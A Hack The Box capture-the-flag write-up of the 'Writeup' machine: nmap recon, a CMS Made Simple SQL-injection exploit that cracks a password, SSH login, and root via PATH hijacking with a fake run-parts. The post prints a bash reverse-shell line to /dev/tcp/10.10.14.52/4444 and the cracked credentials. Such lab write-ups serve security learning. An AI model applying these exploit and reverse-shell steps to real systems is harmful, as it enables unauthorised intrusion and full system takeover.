---
title: "Hack The Box - Writeup"
author: Ryan Kozak
layout: post
permalink: /hack-the-box-writeup-4-writeup/
categories:
  - CTF Writeup
  - Security
tags:
  - CTF
  - Hack The Box
  - Linux
  - Privilege Escalation
  - PHP
  - CMS Made Simple
---
![Hack The Box Writeup](/wp-content/uploads/2019/07/writeup/badge.png)


# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
root@kali:/media/sf_Research# nmap -sVC 10.10.10.138
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-17 20:23 EDT
Nmap scan report for 10.10.10.138
Host is up (0.37s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds
```

From the above output we can see that ports, **22** and **80** are the only ports open. It also appears as though there's a `robots.txt` file disallowing a directory called `/writeup` on the web server.


```console
root@kali:/media/sf_Research# curl http://10.10.10.138/robots.txt
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: *
Disallow: /writeup/
```

![Index of port 80](/wp-content/uploads/2019/07/writeup/main_80.png)


Running some directory enumeration tools on the main web port didn't turn up anything interesting. The page indicates that the site isn't ready yet, but contains various articles on Hack The Box writeups. When we navigate to the `/writeup` directory we see that this is where the CMS root directory is located.

![/writeup running directory CMS Made Simple](/wp-content/uploads/2019/07/writeup/cms.png)


We can determine that the site is running [CMS Made Simple](https://www.cmsmadesimple.org/). This can be done by checking the source code, but in my case the Firefox extension [Webappalyzer](https://www.wappalyzer.com/) indicated such. After browsing unauthenticated exploits for the CMS we come across one that works perfectly [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635).


# Exploitation  

In order to gain our initial foothold we execute the exploit with the `rockyou.txt` worldlist in order for it to crack the hashed password.

```console
root@kali:~/Desktop# python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

While some users on the forum indicated the need to adjust their system time in order for this exploit to function, I did not have to do anything of that nature. The exploit returned the above the first time it was run, and then again when I rerooted the box for the purposes of this writeup.

The username and password did not provide access to the backend of the CMS. They do, however, provide us ssh access to the box.

## User Flag

In order to get the user flag, we simply need to ssh into the box and move to the home directory of the `jkr` user.

```
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jun 20 19:17:35 2019 from 10.10.14.157
jkr@writeup:~$ pwd
/home/jkr
jkr@writeup:~$ ls -la
total 72
drwxr-xr-x 2 jkr  jkr   4096 Jun 20 19:10 .
drwxr-xr-x 3 root root  4096 Apr 19 04:14 ..
-r--r--r-- 1 root root    33 Apr 19 08:43 user.txt
jkr@writeup:~$ cat user.txt
d4e493fd4068afc9eb1aa6a55319f978
```

## Root Flag

The privilege escalation for this box was not as immediately apparent to me as it was on SwagShop. Running [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) did not return anything very useful for me. Some users on the forum indicated using a tool called [Pspy](https://github.com/DominicBreuker/pspy). This tool allows us to "Monitor Linux processes without root permissions". After running this script for a while something interesting appears when other users access the box via ssh.

![output from pyspy](/wp-content/uploads/2019/07/writeup/pyspy.png)


The `PATH` variable contains a directory `/usr/local/sbin` as its first priority.

```console
jkr@writeup:~$ cd /usr/local/
jkr@writeup:/usr/local$ ls -la
total 64
drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..
drwx-wsr-x  2 root staff 20480 Apr 19 04:11 bin
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -> share/man
drwx-wsr-x  2 root staff 12288 Apr 19 04:11 sbin
drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
```

As we see above, we also have access to write to and execute scripts from the `/usr/local/sbin` directory. This means that we can create our own `run-parts` to execute other scripts as root. So lets do that.


First we create a script to call our reverse shell, because adding the reverse shell directly to `run-parts` didn't seem to be doing the trick.

```console
jkr@writeup:/usr/local/sbin$ nano shelly.sh && chmod +x shelly.sh
```

Here is what `shelly.sh` contains.

```bash
#!/bin/sh  
bash -i >& /dev/tcp/10.10.14.52/4444 0>&1
```

Next we actually create the `run-parts` script within `/usr/local/sbin` so that it calls `shelly.sh`

```console
jkr@writeup:/usr/local/sbin$ nano run-parts && chmod +x run-parts
```

When we ssh in again from another terminal, we'll get our reverse shell with root privileges.

![tmux screenshot of achieving root privileges](/wp-content/uploads/2019/07/writeup/rooted.png)


# Conclusion

Writeup was a quick and easy box. The initial exploit for the CMS was really fun to watch run, as others have said it felt like The Matrix. After that, the privilege escalation had me a little stumped until I heard about pyspy, then it was fairly easy since the `PATH` variable stuck out like a soar thumb. It was still fun to figure out how to exploit that after discovery though, and getting the root shell was rather satisfying.
